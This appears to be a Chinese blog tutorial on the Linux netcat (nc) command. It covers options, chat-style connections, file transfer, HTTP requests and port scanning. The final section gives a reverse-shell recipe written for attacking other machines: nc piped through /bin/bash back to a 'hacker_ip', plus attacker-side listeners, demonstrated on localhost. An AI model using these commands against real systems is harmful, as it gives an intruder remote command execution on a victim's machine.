---
title: Linux命令-nc（端口监控、文件传输、反弹shell等）
published: 2023-05-20 16:21
tags: [安全, Linux, nc]
category: 工具
draft: false
---

# Linux命令-nc（端口监控、文件传输、反弹shell等）

简介

nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具。进行TCP、UDP的连接和监听，可以将标准错误分离。

参数

```
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
  [-x proxy_address[:port]] [destination] [port]

  Command Summary:
       -4        Use IPv4
       -6        Use IPv6
       -b        Allow broadcast
       -C        Send CRLF as line-ending
       -D        Enable the debug socket option
       -d        Detach from stdin
       -h        This help text
       -I length    TCP receive buffer length
       -i secs     Delay interval for lines sent, ports scanned
       -j        Use jumbo frame
       -k        Keep inbound sockets open for multiple connects
       -l        Listen mode, for inbound connects
       -n        Suppress name/port resolutions
       -O length    TCP send buffer length
       -P proxyuser   Username for proxy authentication
       -p port     Specify local port for remote connects
       -q secs     quit after EOF on stdin and delay of secs
       -r        Randomize remote ports
       -S        Enable the TCP MD5 signature option
       -s addr     Local source address
       -T toskeyword  Set IP Type of Service
       -t        Answer TELNET negotiation
       -U        Use UNIX domain socket
       -u        UDP mode
       -V rtable    Specify alternate routing table
       -v        Verbose
       -w secs     Timeout for connects and final net reads
       -X proto     Proxy protocol: "4", "5" (SOCKS) or "connect"
       -x addr[:port]  Specify proxy address and port
       -Z        DCCP mode
       -z        Zero-I/O mode [used for scanning]
   Port numbers can be individual or ranges: lo-hi [inclusive]
```

nc的作用

简单的TCP代理

基于shell脚本的HTTP客户端或服务器

网络守护进程/程序测试

文件传输

反弹shell（非本意）

参数详解

nc参数

| 参数                    | 解释                                                         |
| ----------------------- | ------------------------------------------------------------ |
| -4                      | 强制nc仅使用IPv4地址                                         |
| -6                      | 强制nc仅使用IPv6地址                                         |
| -b                      | 允许广播                                                     |
| -C                      | 发送CRLF作为行结束符                                         |
| -D                      | 在套接字上启动测试                                           |
| -d                      | 不要试图从标准输入读入数据                                   |
| -h                      | 打印nc帮助                                                   |
| -l length               | 指定TCP接收缓冲区大小                                        |
| -i interval             | 指定发送和接收的文本行之间的延迟时间间隔。还会导致连接到多个端口之间的延迟时间。 |
| **-k**                  | **强制nc在当前连接完成后继续侦听另一个连接。在没有-l选项的情况下使用此选项是错误的。** |
| **-l**                  | **用于指定nc应侦听传入连接，而不是启动到远程主机的连接。将此选项与-p、-s或-z选项结合使用是错误的。此外，使用-w选项指定的任何超时都将被忽略。** |
| -n                      | 不要在任何指定的地址、主机名或端口上执行任何DNS或服务查找。  |
| -O length               | 指定TCP发送缓冲区大小                                        |
| -P proxy_username       | 指定要呈现给需要身份验证的代理服务器的用户名。如果未指定用户名，则不会尝试身份验证。目前仅支持HTTP CONNECT代理的代理身份验证。 |
| **-p source_port**      | **根据权限限制和可用性，指定nc应使用的源端口。支持nn-mm范围模式和空格分隔。** |
| -q seconds              | 在stdin上执行EOF后，等待指定的秒数，然后退出。如果秒数为负，则永远等待。 |
| -r                      | 指定应随机选择源端口和/或目标端口，而不是在某个范围内或按照系统分配的顺序顺序进行选择。 |
| -S                      | 启用RFC 2385 TCP MD5签名选项。                               |
| -s source_ip            | 指定用于发送数据包的接口的IP。对于UNIX域数据报套接字，指定要创建和使用的本地临时套接字文件，以便可以接收数据报。将此选项与-l选项结合使用是错误的。 |
| -U                      | 指定使用UNIX域套接字。                                       |
| **-u**                  | **使用UDP而不是TCP的默认选项。对于UNIX域套接字，请使用数据报套接字而不是流套接字。如果使用UNIX域套接字，则在/tmp中创建临时接收套接字，除非给出-s标志。** |
| -V rtable               | 设置要使用的路由表。默认值为0。                              |
| **-v**                  | **让nc提供更详细的输出。**                                   |
| -w timeout              | 无法建立或在超时秒后处于空闲状态的连接。-w标志对-l选项没有影响，即nc将永久侦听连接，无论是否使用-w标志。默认值为无超时。 |
| -X proxy_protocol       | 请求nc在与代理服务器对话时应使用指定的协议。支持的协议有“4”（SOCKS v.4）、“5”（SOCKS v.5）和“connect”（HTTPS代理）。如果未指定协议，则使用SOCKS版本5。 |
| -x proxy_address[:port] | 请求nc应使用代理地址和端口处的代理连接到目标。如果未指定端口，则使用代理协议的已知端口（1080用于SOCKS，3128用于HTTPS）。 |
| -Z                      | DCCP模式。                                                   |
| **-z**                  | **指定nc应该只扫描侦听守护进程，而不向它们发送任何数据。将此选项与-l选项结合使用是错误的。** |

使用举例

## 客户/服务器模式

服务器端：监听端口

```
nc -l 6633
```

客户端：开启连接

```
nc 127.0.0.1 6633
```

![](/images/posts/linux-nc/1.jpg)

服务器端

![](/images/posts/linux-nc/2.jpg)

这是同一台服务器，使用了tmux，开了frankyu和yubo，两个session。客户端和服务端就建立了Tcp连接，进行通信。

**注意：当我们关闭客户端时，服务端也会关闭，可以添加-k选项，使服务端不关闭。**

## 文件传输

对上面的客户/服务器模式进行扩展即可。使用linux的重定向。

服务器端：

```
nc -l 6633 > filename.out
```

客户端：

```
nc 127.0.0.1 6633 < filename.in
```

## 基于TCP的上层协议

可以通过nc发送基于TCP的上层协议数据包，例如，应用层的HTTP协议

```
printf "GET / HTTP/1.0\r\n\r\n" | nc host.example.com 80
```

## 端口扫描

利用-z和-v参数，输出是否连接成功

```
nc -zv ip/host ports
```

![](/images/posts/linux-nc/3.jpg)

可以看到22端口打开了。也可使用 22 80 6633，这种空格分隔的形式。

使用-u，就可以进行udp的扫描。当然，更详细的端口扫描还是使用Nmap。

## 反弹Shell

我们攻击其他的机器的时候，拿不到22端口的口令或私钥，甚至22端口没有打开。我们想要实时运行命令时，就可以使用nc反弹shell，有一种我们在操控对方电脑的感觉。利用前面的端口监听结合管道来实现。

在受害者机器上运行

```
nc -l port| /bin/bash/ | nc hacker_ip port
```

在攻击机上运行

```
nc -l port

nc victim_ip port
```

shell反弹示意图

![](/images/posts/linux-nc/4.jpg)

这里攻击机和受害机都是使用的一台。

攻击机监听6655端口

```
nc -l 6655
```

操纵受害机6633端口接收命令，执行后结果输出到攻击机的6655端口

```
nc -l 6633 |/bin/bash/| nc 127.0.0.1 6655
```

攻击机开启6633端口发送命令

```
nc 127.0.0.1 6633
```

![](/images/posts/linux-nc/5.jpg)

![](/images/posts/linux-nc/6.jpg)

从攻击机源端口发送命令，就可以从目的端口接收命令执行的结果。